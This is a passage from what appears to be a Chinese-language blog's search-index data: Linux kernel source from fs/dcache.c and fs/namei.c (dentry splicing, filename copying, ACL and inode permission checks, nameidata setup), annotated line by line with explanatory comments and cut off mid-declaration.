123456789101112131415161718192021222324252627282930313233343536373839/** * d_splice_alias - 将一个断开的dentry拼接到树中（如果存在） * @inode: 可能有一个断开的dentry的inode * @dentry: 我们想要指向该inode的一个负的dentry * * 如果inode是一个目录并且有一个IS_ROOT别名，则将其d_move到给定的dentry的位置并返回它，否则只是将inode添加到dentry中并返回NULL。 * * 如果找到一个非IS_ROOT的目录，则文件系统已损坏，我们应该报错：目录不能有多个别名。 * * 这在任何可导出的文件系统（通过knfsd）的查找例程中是必需的，以便我们可以有效地构建到目录的dcache路径。 * * 如果找到并移动了一个dentry，则返回它。否则返回NULL。 * ... 检查dentry是否已经被哈希，仅在最后一种情况下进行检查。 */struct dentry *d_splice_alias(struct inode *inode, struct dentry *dentry)&#123; if (IS_ERR(inode)) return ERR_CAST(inode); BUG_ON(!d_unhashed(dentry)); if (inode-&gt;i_mode &amp; S_IFDIR) &#123; // 如果inode是一个目录 struct dentry *alias = d_find_alias(inode); // 查找inode的别名 if (alias) &#123; // 如果找到别名 if (IS_ROOT(alias)) &#123; // 如果别名是根目录 struct dentry *moved = d_move(alias, dentry); // 将别名移动到给定的dentry的位置 if (moved) return moved; // 返回移动后的dentry &#125; else &#123; WARN_ON(1); // 文件系统已损坏，目录不能有多个别名 return ERR_PTR(-EIO); // 返回错误指针 &#125; &#125; &#125; d_add(dentry, inode); // 将inode添加到dentry中 return NULL; // 返回NULL，表示没有移动dentry&#125;EXPORT_SYMBOL(d_splice_alias); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/* * Test whether new_dentry is a subdirectory of old_dentry. * 测试new_dentry是否是old_dentry的子目录。 * * Trivially implemented using the dcache structure * 使用dcache结构简单实现 *//** * is_subdir - is new dentry a subdirectory of old_dentry * is_subdir - 判断new_dentry是否是old_dentry的子目录 * @new_dentry: new dentry * @old_dentry: old dentry * * Returns true if new_dentry is a subdirectory of the parent (at any depth). * 返回true，如果new_dentry是父目录的子目录（在任何深度）。 * Returns false otherwise. * 否则返回false。 * Caller must ensure that &quot;new_dentry&quot; is pinned before calling is_subdir() * 调用者必须确保在调用is_subdir()之前&quot;new_dentry&quot;已经被固定。 */bool is_subdir(struct dentry *new_dentry, struct dentry *old_dentry)&#123; bool result; unsigned seq; if (new_dentry == old_dentry) return true; // 如果new_dentry和old_dentry相等，则返回true do &#123; /* for restarting inner loop in case of seq retry */ seq = read_seqbegin(&amp;rename_lock); // 读取序列号 /* * Need rcu_readlock ... to protect against the d_parent trashing * due to d_move */ rcu_read_lock(); // 获取RCU读锁 if (d_ancestor(old_dentry, new_dentry)) result = true; // 如果new_dentry是old_dentry的祖先目录，则设置result为true else result = false; // 否则设置result为false rcu_read_unlock(); // 释放RCU读锁 &#125; while (read_seqretry(&amp;rename_lock, seq)); // 如果序列号重试，则重新执行循环 return result; // 返回结果&#125;EXPORT_SYMBOL(is_subdir); // 导出is_subdir符号static enum d_walk_ret d_genocide_kill(void *data, struct dentry *dentry)&#123; struct dentry *root = data; // 获取根节点 if (dentry != root) &#123; // 如果dentry不是根节点 if (d_unhashed(dentry) || !dentry-&gt;d_inode) // 如果dentry未哈希或者没有关联的inode return D_WALK_SKIP; // 跳过该dentry if (!(dentry-&gt;d_flags &amp; DCACHE_GENOCIDE)) &#123; // 如果dentry的标志位中没有DCACHE_GENOCIDE标志 dentry-&gt;d_flags |= DCACHE_GENOCIDE; // 设置dentry的标志位为DCACHE_GENOCIDE dentry-&gt;d_lockref.count--; // 减少dentry的锁引用计数 &#125; &#125; return D_WALK_CONTINUE; // 返回D_WALK_CONTINUE，表示继续遍历&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374void d_genocide(struct dentry *parent)&#123; // 遍历父目录下的所有目录项，并调用d_genocide_kill函数 d_walk(parent, parent, d_genocide_kill);&#125;EXPORT_SYMBOL(d_genocide);void d_tmpfile(struct file *file, struct inode *inode)&#123; // 获取文件的目录项 struct dentry *dentry = file-&gt;f_path.dentry; // 减少inode的链接计数 inode_dec_link_count(inode); // 检查目录项的名称是否等于目录项的内部名称 // 检查目录项是否未在别名哈希表中 // 检查目录项是否已被删除 BUG_ON(dentry-&gt;d_name.name != dentry-&gt;d_iname || !hlist_unhashed(&amp;dentry-&gt;d_u.d_alias) || !d_unlinked(dentry)); // 获取目录项的父目录锁和目录项锁 spin_lock(&amp;dentry-&gt;d_parent-&gt;d_lock); spin_lock_nested(&amp;dentry-&gt;d_lock, DENTRY_D_LOCK_NESTED); // 将inode的编号转换为字符串，并更新目录项的名称和内部名称 dentry-&gt;d_name.len = sprintf(dentry-&gt;d_iname, &quot;#%llu&quot;, (unsigned long long)inode-&gt;i_ino); // 释放目录项锁和父目录锁 spin_unlock(&amp;dentry-&gt;d_lock); spin_unlock(&amp;dentry-&gt;d_parent-&gt;d_lock); // 在目录项中实例化inode d_instantiate(dentry, inode);&#125;EXPORT_SYMBOL(d_tmpfile);static __initdata unsigned long dhash_entries;// 设置dhash_entries的值static int __init set_dhash_entries(char *str)&#123; if (!str) return 0; dhash_entries = simple_strtoul(str, &amp;str, 0); return 1;&#125;// 在内核启动时设置dhash_entries的值__setup(&quot;dhash_entries=&quot;, set_dhash_entries);static void __init dcache_init_early(void)&#123; // 如果哈希分布在NUMA节点上，则延迟哈希分配直到vmalloc空间可用 if (hashdist) return; // 分配dentry哈希表 dentry_hashtable = alloc_large_system_hash(&quot;Dentry cache&quot;, sizeof(struct hlist_bl_head), dhash_entries, 13, HASH_EARLY | HASH_ZERO, &amp;d_hash_shift, NULL, 0, 0); d_hash_shift = 32 - d_hash_shift;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374static void __init dcache_init(void)&#123; /* * 可以为稳定状态（如列表）添加构造函数，但由于dcache的缓存特性，可能不值得这样做。 */ // 创建dentry缓存 dentry_cache = KMEM_CACHE_USERCOPY(dentry, SLAB_RECLAIM_ACCOUNT | SLAB_PANIC | SLAB_MEM_SPREAD | SLAB_ACCOUNT, d_iname); /* 如果在dcache_init_early中设置了哈希表，则直接返回 */ if (!hashdist) return; // 分配dentry哈希表 dentry_hashtable = alloc_large_system_hash(&quot;Dentry cache&quot;, sizeof(struct hlist_bl_head), dhash_entries, 13, HASH_ZERO, &amp;d_hash_shift, NULL, 0, 0); d_hash_shift = 32 - d_hash_shift;&#125;/* 用于__getname()函数的SLAB缓存 */struct kmem_cache *names_cachep __read_mostly;EXPORT_SYMBOL(names_cachep);void __init vfs_caches_init_early(void)&#123; int i; // 初始化in_lookup_hashtable数组中的每个哈希表头 for (i = 0; i &lt; ARRAY_SIZE(in_lookup_hashtable); i++) INIT_HLIST_BL_HEAD(&amp;in_lookup_hashtable[i]); // 初始化dcache dcache_init_early(); // 初始化inode inode_init_early();&#125;void __init vfs_caches_init(void)&#123; // 创建names_cachep缓存 names_cachep = kmem_cache_create_usercopy(&quot;names_cache&quot;, PATH_MAX, 0, SLAB_HWCACHE_ALIGN | SLAB_PANIC, 0, PATH_MAX, NULL); // 初始化dcache dcache_init(); // 初始化inode inode_init(); // 初始化files files_init(); // 初始化files_maxfiles files_maxfiles_init(); // 初始化mnt mnt_init(); // 初始化bdev缓存 bdev_cache_init(); // 初始化chrdev chrdev_init();&#125;","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"VFS","slug":"Linux内核/VFS","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/VFS/"}],"tags":[]},{"title":"学习 Linux /fs/namei.c源码分析","slug":"学习-Linux-fs-namei-c源码分析","date":"2023-07-29T01:11:29.000Z","updated":"2023-08-20T10:35:57.890Z","comments":true,"path":"2023/07/29/学习-Linux-fs-namei-c源码分析/","link":"","permalink":"http://example.com/2023/07/29/%E5%AD%A6%E4%B9%A0-Linux-fs-namei-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"namei.c - fs&#x2F;namei.c - Linux source code (v6.3.7) - Bootlin 12#define EMBEDDED_NAME_MAX (PATH_MAX - offsetof(struct filename, iname))// 定义 EMBEDDED_NAME_MAX，这是嵌入式文件名的最大长度。长度等于 PATH_MAX（一个路径的最大长度）减去 struct filename 中 iname 字段的偏移量。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118struct filename *getname_flags(const char __user *filename, int flags, int *empty)// 这个函数是从用户空间获取文件名，并将其复制到内核空间。函数接受三个参数：用户提供的文件名，一组标志，以及一个指向整数的指针，用于指示路径是否为空。&#123; struct filename *result; char *kname; int len; // 定义三个变量：一个指向 struct filename 的指针，一个字符指针，以及一个整数。 result = audit_reusename(filename); // 尝试重用给定的文件名。如果成功，返回指向重用的文件名的指针。 if (result) return result; // 如果重用成功，返回结果。 result = __getname(); // 尝试从名字缓存中获取一个新的文件名。 if (unlikely(!result)) return ERR_PTR(-ENOMEM); // 如果无法获取新的文件名（可能是因为内存不足），则返回错误。 kname = (char *)result-&gt;iname; // 获取新文件名的 iname 字段，这是一个内部的名字。 result-&gt;name = kname; // 将内部名字赋给外部名字。 len = strncpy_from_user(kname, filename, EMBEDDED_NAME_MAX); // 尝试从用户空间复制文件名到内核空间。最多复制 EMBEDDED_NAME_MAX 个字符。 if (unlikely(len &lt; 0)) &#123; __putname(result); // 如果复制失败，释放之前获取的文件名。 return ERR_PTR(len); // 返回错误。 &#125; if (unlikely(len == EMBEDDED_NAME_MAX)) &#123; const size_t size = offsetof(struct filename, iname[1]); // 如果复制的长度等于 EMBEDDED_NAME_MAX，需要重新分配内存。计算新的大小。 kname = (char *)result; // 保存当前的结果。 result = kzalloc(size, GFP_KERNEL); // 为新的文件名分配内存。 if (unlikely(!result)) &#123; __putname(kname); // 如果分配失败，释放之前的结果。 return ERR_PTR(-ENOMEM); // 返回错误。 &#125; result-&gt;name = kname; // 将名字赋给新的结果。 len = strncpy_from_user(kname, filename, PATH_MAX); // 从用户空间复制文件名到内核空间。这次复制的最大长度是 PATH_MAX。 if (unlikely(len &lt; 0)) &#123; __putname(kname); // 如果复制失败，释放之前的结果。 kfree(result); // 释放新的结果。 return ERR_PTR(len); // 返回错误。 &#125; if (unlikely(len == PATH_MAX)) &#123; __putname(kname); // 如果复制的长度等于 PATH_MAX，释放之前的结果。 kfree(result); // 释放新的结果。 return ERR_PTR(-ENAMETOOLONG); // 返回错误，表示名字过长。 &#125; &#125; result-&gt;refcnt = 1; // 设置新的结果的引用计数为 1。 if (unlikely(!len)) &#123; if (empty) *empty = 1; // 如果文件名的长度为 0（即文件名为空），设置 *empty 为 1。 if (!(flags &amp; LOOKUP_EMPTY)) &#123; putname(result); // 如果不允许查找空的文件名，释放结果。 return ERR_PTR(-ENOENT); // 返回错误，表示没有这个文件或目录。 &#125; &#125; result-&gt;uptr = filename; result-&gt;uptr = filename; // 设置新的结果的用户空间指针为传入的 filename。 result-&gt;aname = NULL; // 设置新的结果的审计名字为 NULL。 audit_getname(result); // 获取新的结果的审计名字。 return result; // 返回新的结果。&#125;","text":"namei.c - fs&#x2F;namei.c - Linux source code (v6.3.7) - Bootlin 12#define EMBEDDED_NAME_MAX (PATH_MAX - offsetof(struct filename, iname))// 定义 EMBEDDED_NAME_MAX，这是嵌入式文件名的最大长度。长度等于 PATH_MAX（一个路径的最大长度）减去 struct filename 中 iname 字段的偏移量。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118struct filename *getname_flags(const char __user *filename, int flags, int *empty)// 这个函数是从用户空间获取文件名，并将其复制到内核空间。函数接受三个参数：用户提供的文件名，一组标志，以及一个指向整数的指针，用于指示路径是否为空。&#123; struct filename *result; char *kname; int len; // 定义三个变量：一个指向 struct filename 的指针，一个字符指针，以及一个整数。 result = audit_reusename(filename); // 尝试重用给定的文件名。如果成功，返回指向重用的文件名的指针。 if (result) return result; // 如果重用成功，返回结果。 result = __getname(); // 尝试从名字缓存中获取一个新的文件名。 if (unlikely(!result)) return ERR_PTR(-ENOMEM); // 如果无法获取新的文件名（可能是因为内存不足），则返回错误。 kname = (char *)result-&gt;iname; // 获取新文件名的 iname 字段，这是一个内部的名字。 result-&gt;name = kname; // 将内部名字赋给外部名字。 len = strncpy_from_user(kname, filename, EMBEDDED_NAME_MAX); // 尝试从用户空间复制文件名到内核空间。最多复制 EMBEDDED_NAME_MAX 个字符。 if (unlikely(len &lt; 0)) &#123; __putname(result); // 如果复制失败，释放之前获取的文件名。 return ERR_PTR(len); // 返回错误。 &#125; if (unlikely(len == EMBEDDED_NAME_MAX)) &#123; const size_t size = offsetof(struct filename, iname[1]); // 如果复制的长度等于 EMBEDDED_NAME_MAX，需要重新分配内存。计算新的大小。 kname = (char *)result; // 保存当前的结果。 result = kzalloc(size, GFP_KERNEL); // 为新的文件名分配内存。 if (unlikely(!result)) &#123; __putname(kname); // 如果分配失败，释放之前的结果。 return ERR_PTR(-ENOMEM); // 返回错误。 &#125; result-&gt;name = kname; // 将名字赋给新的结果。 len = strncpy_from_user(kname, filename, PATH_MAX); // 从用户空间复制文件名到内核空间。这次复制的最大长度是 PATH_MAX。 if (unlikely(len &lt; 0)) &#123; __putname(kname); // 如果复制失败，释放之前的结果。 kfree(result); // 释放新的结果。 return ERR_PTR(len); // 返回错误。 &#125; if (unlikely(len == PATH_MAX)) &#123; __putname(kname); // 如果复制的长度等于 PATH_MAX，释放之前的结果。 kfree(result); // 释放新的结果。 return ERR_PTR(-ENAMETOOLONG); // 返回错误，表示名字过长。 &#125; &#125; result-&gt;refcnt = 1; // 设置新的结果的引用计数为 1。 if (unlikely(!len)) &#123; if (empty) *empty = 1; // 如果文件名的长度为 0（即文件名为空），设置 *empty 为 1。 if (!(flags &amp; LOOKUP_EMPTY)) &#123; putname(result); // 如果不允许查找空的文件名，释放结果。 return ERR_PTR(-ENOENT); // 返回错误，表示没有这个文件或目录。 &#125; &#125; result-&gt;uptr = filename; result-&gt;uptr = filename; // 设置新的结果的用户空间指针为传入的 filename。 result-&gt;aname = NULL; // 设置新的结果的审计名字为 NULL。 audit_getname(result); // 获取新的结果的审计名字。 return result; // 返回新的结果。&#125; 1234567891011struct filename *getname_uflags(const char __user *filename, int uflags)// 这个函数用于根据用户空间的标志获取文件名。&#123; int flags = (uflags &amp; AT_EMPTY_PATH) ? LOOKUP_EMPTY : 0; // 如果用户空间的标志包含 AT_EMPTY_PATH，则设置内核空间的标志为 LOOKUP_EMPTY；否则设置为 0。 return getname_flags(filename, flags, NULL); // 调用 getname_flags 函数获取文件名，并传入上面计算出的标志。这个函数不处理 &quot;empty&quot; 参数，所以直接传入 NULL。&#125; 12345678struct filename *getname(const char __user * filename)// 这个函数用于获取文件名，不接受任何标志。&#123; return getname_flags(filename, 0, NULL); // 调用 getname_flags 函数获取文件名，标志设置为 0，不处理 &quot;empty&quot; 参数，所以直接传入 NULL。&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364struct filename *getname_kernel(const char * filename)// 这个函数用于获取内核空间的文件名。&#123; struct filename *result; int len = strlen(filename) + 1; // 定义一个指向 struct filename 的指针，并计算文件名的长度（包括结束符）。 result = __getname(); // 从名字缓存中获取一个新的文件名。 if (unlikely(!result)) return ERR_PTR(-ENOMEM); // 如果无法获取新的文件名（可能是因为内存不足），则返回错误。 if (len &lt;= EMBEDDED_NAME_MAX) &#123; result-&gt;name = (char *)result-&gt;iname; // 如果文件名的长度小于等于 EMBEDDED_NAME_MAX，则将文件名存储在 iname 字段中。 &#125; else if (len &lt;= PATH_MAX) &#123; const size_t size = offsetof(struct filename, iname[1]); struct filename *tmp; // 如果文件名的长度大于 EMBEDDED_NAME_MAX 但小于等于 PATH_MAX，则需要重新分配内存。计算新的大小。 tmp = kmalloc(size, GFP_KERNEL); // 为新的文件名分配内存。 if (unlikely(!tmp)) &#123; __putname(result); // 如果分配失败，释放之前获取的文件名。 return ERR_PTR(-ENOMEM); // 返回错误。 &#125; tmp-&gt;name = (char *)result; // 将之前获取的文件名赋给新的文件名。 result = tmp; // 更新结果。 &#125; else &#123; __putname(result); // 如果文件名的长度大于 PATH_MAX，释放之前获取的文件名。 return ERR_PTR(-ENAMETOOLONG); // 返回错误，表示名字过长。 &#125; memcpy((char *)result-&gt;name, filename, len); // 复制文件名到结果。 result-&gt;uptr = NULL; // 设置用户空间指针为 NULL，因为这个函数接受的是内核空间的文件名。 result-&gt;aname = NULL; // 设置审计名字为 NULL。 result-&gt;refcnt = 1; // 设置引用计数为 1。 audit_getname(result); // 获取审计名字。 return result; // 返回结果。&#125; 1234567891011121314151617181920212223void putname(struct filename *name)// 这个函数用于减少文件名的引用计数，当引用计数为 0 时释放文件名。&#123; if (IS_ERR(name)) return; // 如果文件名是一个错误指针，直接返回。 BUG_ON(name-&gt;refcnt &lt;= 0); // 如果文件名的引用计数小于等于 0，触发 BUG。 if (--name-&gt;refcnt &gt; 0) return; // 减少文件名的引用计数，如果引用计数大于 0，直接返回。 if (name-&gt;name != name-&gt;iname) &#123; __putname(name-&gt;name); kfree(name); // 如果文件名不是存储在 iname 字段中的，调用 __putname 释放文件名，并释放整个 filename 结构。 &#125; else __putname(name); // 否则，直接调用 __putname 释放整个 filename 结构。&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * check_acl - perform ACL permission checking * @idmap: idmap of the mount the inode was found from * @inode: inode to check permissions on * @mask: right to check for (%MAY_READ, %MAY_WRITE, %MAY_EXEC ...) * * This function performs the ACL permission checking. Since this function * retrieve POSIX acls it needs to know whether it is called from a blocking or * non-blocking context and thus cares about the MAY_NOT_BLOCK bit. * * If the inode has been found through an idmapped mount the idmap of * the vfsmount must be passed through @idmap. This function will then take * care to map the inode according to @idmap before checking permissions. * On non-idmapped mounts or if permission checking is to be performed on the * raw inode simply pass @nop_mnt_idmap. */static int check_acl(struct mnt_idmap *idmap, struct inode *inode, int mask)// 这个函数用于检查 ACL 访问权限。如果文件节点是通过 idmapped 挂载找到的，需要传入 idmap 参数，这个函数会在检查权限之前先映射文件节点。// 对于非 idmapped 挂载，或者要检查原始文件节点的权限，直接传入 nop_mnt_idmap。&#123;#ifdef CONFIG_FS_POSIX_ACL // 如果启用了 POSIX ACL，执行以下代码。 struct posix_acl *acl; if (mask &amp; MAY_NOT_BLOCK) &#123; acl = get_cached_acl_rcu(inode, ACL_TYPE_ACCESS); if (!acl) return -EAGAIN; // 如果 mask 包含 MAY_NOT_BLOCK，从 RCU 缓存中获取 ACL，如果获取不到，返回 -EAGAIN。 /* no -&gt;get_inode_acl() calls in RCU mode... */ if (is_uncached_acl(acl)) return -ECHILD; // 在 RCU 模式下不调用 get_inode_acl()，如果 ACL 不在缓存中，返回 -ECHILD。 return posix_acl_permission(idmap, inode, acl, mask); // 返回 posix_acl_permission 的调用结果，此函数用于检查权限。 &#125; acl = get_inode_acl(inode, ACL_TYPE_ACCESS); // 获取 inode 的 ACL。 if (IS_ERR(acl)) return PTR_ERR(acl); // 如果 ACL 是一个错误指针，返回错误。 if (acl) &#123; int error = posix_acl_permission(idmap, inode, acl, mask); posix_acl_release(acl); return error; // 如果 ACL 存在，检查权限，然后释放 ACL，返回检查结果。 &#125;#endif return -EAGAIN; // 如果未启用 POSIX ACL，或者 ACL 不存在，返回 -EAGAIN。&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * acl_permission_check - perform basic UNIX permission checking * @idmap: idmap of the mount the inode was found from * @inode: inode to check permissions on * @mask: right to check for (%MAY_READ, %MAY_WRITE, %MAY_EXEC ...) * * This function performs the basic UNIX permission checking. Since this * function may retrieve POSIX acls it needs to know whether it is called from a * blocking or non-blocking context and thus cares about the MAY_NOT_BLOCK bit. * * If the inode has been found through an idmapped mount the idmap of * the vfsmount must be passed through @idmap. This function will then take * care to map the inode according to @idmap before checking permissions. * On non-idmapped mounts or if permission checking is to be performed on the * raw inode simply passs @nop_mnt_idmap. */static int acl_permission_check(struct mnt_idmap *idmap, struct inode *inode, int mask)// 这个函数执行基本的UNIX权限检查。如果文件节点是通过 idmapped 挂载找到的，需要传入 idmap 参数，这个函数会在检查权限之前先映射文件节点。// 对于非 idmapped 挂载，或者要检查原始文件节点的权限，直接传入 nop_mnt_idmap。&#123; unsigned int mode = inode-&gt;i_mode; // 获取 inode 的模式。 vfsuid_t vfsuid; /* Are we the owner? If so, ACL&#x27;s don&#x27;t matter */ vfsuid = i_uid_into_vfsuid(idmap, inode); if (likely(vfsuid_eq_kuid(vfsuid, current_fsuid()))) &#123; mask &amp;= 7; mode &gt;&gt;= 6; return (mask &amp; ~mode) ? -EACCES : 0; &#125; // 如果我们是所有者，ACL无关紧要。我们只需检查用户的权限。 /* Do we have ACL&#x27;s? */ if (IS_POSIXACL(inode) &amp;&amp; (mode &amp; S_IRWXG)) &#123; int error = check_acl(idmap, inode, mask); if (error != -EAGAIN) return error; &#125; // 如果我们有ACL，并且设置了组权限，我们需要检查ACL。如果没有错误发生，返回检查的结果。 /* Only RWX matters for group/other mode bits */ mask &amp;= 7; // 仅保留RWX（读/写/执行）权限位。 /* * Are the group permissions different from * the other permissions in the bits we care * about? Need to check group ownership if so. */ if (mask &amp; (mode ^ (mode &gt;&gt; 3))) &#123; vfsgid_t vfsgid = i_gid_into_vfsgid(idmap, inode); if (vfsgid_in_group_p(vfsgid)) mode &gt;&gt;= 3; &#125; // 如果组权限与其他权限在我们关心的位上不同，我们需要检查组所有权。 /* Bits in &#x27;mode&#x27; clear that we require? */ return (mask &amp; ~mode) ? -EACCES : 0; // 如果我们需要的权限位在&#x27;mode&#x27;中被清除了，返回 -EACCES，否则返回 0。&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576/** * generic_permission - check for access rights on a Posix-like filesystem * @idmap: idmap of the mount the inode was found from * @inode: inode to check access rights for * @mask: right to check for (%MAY_READ, %MAY_WRITE, %MAY_EXEC, * %MAY_NOT_BLOCK ...) * * Used to check for read/write/execute permissions on a file. * We use &quot;fsuid&quot; for this, letting us set arbitrary permissions * for filesystem access without changing the &quot;normal&quot; uids which * are used for other things. * * generic_permission is rcu-walk aware. It returns -ECHILD in case an rcu-walk * request cannot be satisfied (eg. requires blocking or too much complexity). * It would then be called again in ref-walk mode. * * If the inode has been found through an idmapped mount the idmap of * the vfsmount must be passed through @idmap. This function will then take * care to map the inode according to @idmap before checking permissions. * On non-idmapped mounts or if permission checking is to be performed on the * raw inode simply passs @nop_mnt_idmap. */int generic_permission(struct mnt_idmap *idmap, struct inode *inode, int mask)&#123; int ret; /* * Do the basic permission checks. */ ret = acl_permission_check(idmap, inode, mask); if (ret != -EACCES) return ret; // 首先进行基本权限检查，如果返回值不是 -EACCES，则直接返回结果。 if (S_ISDIR(inode-&gt;i_mode)) &#123; /* DACs are overridable for directories */ if (!(mask &amp; MAY_WRITE)) if (capable_wrt_inode_uidgid(idmap, inode, CAP_DAC_READ_SEARCH)) return 0; if (capable_wrt_inode_uidgid(idmap, inode, CAP_DAC_OVERRIDE)) return 0; return -EACCES; &#125; // 如果 inode 是目录，特权用户可以覆盖 DAC 权限。如果没有写权限，但用户有 CAP_DAC_READ_SEARCH 能力，则返回0。 // 如果用户有 CAP_DAC_OVERRIDE 能力，则返回0。否则返回 -EACCES。 /* * Searching includes executable on directories, else just read. */ mask &amp;= MAY_READ | MAY_WRITE | MAY_EXEC; if (mask == MAY_READ) if (capable_wrt_inode_uidgid(idmap, inode, CAP_DAC_READ_SEARCH)) return 0; // 如果权限掩码仅包含读权限，而用户具有 CAP_DAC_READ_SEARCH 能力，则返回 0。 /* * Read/write DACs are always overridable. * Executable DACs are overridable when there is * at least one exec bit set. */ if (!(mask &amp; MAY_EXEC) || (inode-&gt;i_mode &amp; S_IXUGO)) if (capable_wrt_inode_uidgid(idmap, inode, CAP_DAC_OVERRIDE)) return 0; // 读/写 DAC 总是可以被覆盖。如果权限掩码中没有执行权限，或者 inode 的模式中至少有一个执行位，而用户具有 CAP_DAC_OVERRIDE 能力，则返回 0。 return -EACCES; // 如果上述所有条件都不满足，返回 -EACCES。&#125;EXPORT_SYMBOL(generic_permission);// 将函数 generic_permission 导出，使其可以被其他模块使用。 12345678910111213141516171819static inline int do_inode_permission(struct mnt_idmap *idmap, struct inode *inode, int mask)&#123; // 如果inode的操作标记与IOP_FASTPERM做AND运算的结果不为真（也就是说，inode没有设置使用快速权限检查的标记） if (unlikely(!(inode-&gt;i_opflags &amp; IOP_FASTPERM))) &#123; // 如果inode的操作对象有权限检查函数 if (likely(inode-&gt;i_op-&gt;permission)) // 则调用该函数进行权限检查 return inode-&gt;i_op-&gt;permission(idmap, inode, mask); // 如果inode的操作对象没有权限检查函数，则获取inode的锁 spin_lock(&amp;inode-&gt;i_lock); // 并设置使用快速权限检查的标记 inode-&gt;i_opflags |= IOP_FASTPERM; // 释放inode的锁 spin_unlock(&amp;inode-&gt;i_lock); &#125; // 如果inode设置了使用快速权限检查的标记，或者inode的操作对象没有权限检查函数，则直接调用通用权限检查函数 return generic_permission(idmap, inode, mask);&#125; 123456789101112131415static int sb_permission(struct super_block *sb, struct inode *inode, int mask)&#123; // 如果请求的权限包含写权限 if (unlikely(mask &amp; MAY_WRITE)) &#123; // 获取inode的模式 umode_t mode = inode-&gt;i_mode; // 如果文件系统是只读的，并且inode是常规文件、目录或者符号链接 if (sb_rdonly(sb) &amp;&amp; (S_ISREG(mode) || S_ISDIR(mode) || S_ISLNK(mode))) // 则返回错误，因为没有人能够获取只读文件系统的写权限 return -EROFS; &#125; // 如果请求的权限不包含写权限，或者文件系统不是只读的，或者inode不是常规文件、目录或者符号链接，则返回成功 return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940int inode_permission(struct mnt_idmap *idmap, struct inode *inode, int mask)&#123; int retval; // 首先进行超级块级别的权限检查 retval = sb_permission(inode-&gt;i_sb, inode, mask); // 如果返回错误，则直接返回错误 if (retval) return retval; // 如果请求的权限包含写权限 if (unlikely(mask &amp; MAY_WRITE)) &#123; // 如果inode是不可变的 if (IS_IMMUTABLE(inode)) // 则返回错误，因为没有人能够获取不可变文件的写权限 return -EPERM; // 如果更新mtime可能导致i_uid和i_gid被错误地写回，例如它们的真实值对vfs来说是未知的 if (HAS_UNMAPPED_ID(idmap, inode)) // 则返回错误 return -EACCES; &#125; // 然后进行inode级别的权限检查 retval = do_inode_permission(idmap, inode, mask); // 如果返回错误，则直接返回错误 if (retval) return retval; // 然后进行设备控制组级别的权限检查 retval = devcgroup_inode_permission(inode, mask); // 如果返回错误，则直接返回错误 if (retval) return retval; // 最后进行安全模块级别的权限检查 return security_inode_permission(inode, mask);&#125;// 导出inode_permission符号，使得其他模块可以使用该函数EXPORT_SYMBOL(inode_permission); 123456789101112131415/** * path_get - 增加路径的引用计数 * @path: 要增加引用计数的路径 * * 给定一个路径，增加其目录项（dentry）和虚拟文件系统挂载点（vfsmount）的引用计数。 */void path_get(const struct path *path)&#123; // 增加虚拟文件系统挂载点的引用计数 mntget(path-&gt;mnt); // 增加目录项的引用计数 dget(path-&gt;dentry);&#125;// 导出path_get符号，使得其他模块可以使用该函数EXPORT_SYMBOL(path_get); 123456789101112131415/** * path_put - 减少路径的引用计数 * @path: 要减少引用计数的路径 * * 给定一个路径，减少其目录项（dentry）和虚拟文件系统挂载点（vfsmount）的引用计数。 */void path_put(const struct path *path)&#123; // 减少目录项的引用计数 dput(path-&gt;dentry); // 减少虚拟文件系统挂载点的引用计数 mntput(path-&gt;mnt);&#125;// 导出path_put符号，使得其他模块可以使用该函数EXPORT_SYMBOL(path_put); 12// 定义嵌套层级为2#define EMBEDDED_LEVELS 2 1234567891011121314151617181920212223242526272829303132333435363738394041424344// nameidata 结构体，用于处理文件名查找时的路径名解析struct nameidata &#123; // 保存被查找对象的路径 struct path path; // 保存最后一个被解析的路径组件名称 struct qstr last; // 保存查找的根路径 struct path root; // 指向路径中目录项的inode节点 struct inode *inode; /* path.dentry.d_inode */ // 查找标记 unsigned int flags, state; // 序列号 unsigned seq, next_seq, m_seq, r_seq; // 上一次解析的路径组件类型 int last_type; // 嵌套深度 unsigned depth; // 符号链接的总数 int total_link_count; // 保存之前的状态，用于在处理符号链接时回溯 struct saved &#123; // 符号链接的路径 struct path link; // 延迟调用的函数 struct delayed_call done; // 符号链接的名称 const char *name; // 序列号 unsigned seq; &#125; *stack, internal[EMBEDDED_LEVELS]; // 所查找的文件名 struct filename *name; // 保存的nameidata结构体，用于恢复之前的状态 struct nameidata *saved; // 根路径的序列号 unsigned root_seq; // 目录文件描述符 int dfd; // 目录的vfs用户ID vfsuid_t dir_vfsuid; // 目录的模式 umode_t dir_mode;&#125; __randomize_layout; 1234// 定义标记值#define ND_ROOT_PRESET 1 // 根路径已预设#define ND_ROOT_GRABBED 2 // 根路径已获取#define ND_JUMPED 4 // 已经跳转 12345678910111213141516171819// 设置 nameidata 结构体的值static void __set_nameidata(struct nameidata *p, int dfd, struct filename *name)&#123; // 获取当前线程的 nameidata struct nameidata *old = current-&gt;nameidata; // 初始化 nameidata 结构体 p-&gt;stack = p-&gt;internal; p-&gt;depth = 0; p-&gt;dfd = dfd; p-&gt;name = name; p-&gt;path.mnt = NULL; p-&gt;path.dentry = NULL; p-&gt;total_link_count = old ? old-&gt;total_link_count : 0; p-&gt;saved = old; // 设置当前线程的 nameidata current-&gt;nameidata = p;&#125; 123456789101112// 设置 nameidata 结构体的值，并初始化状态static inline void set_nameidata(struct nameidata *p, int dfd, struct 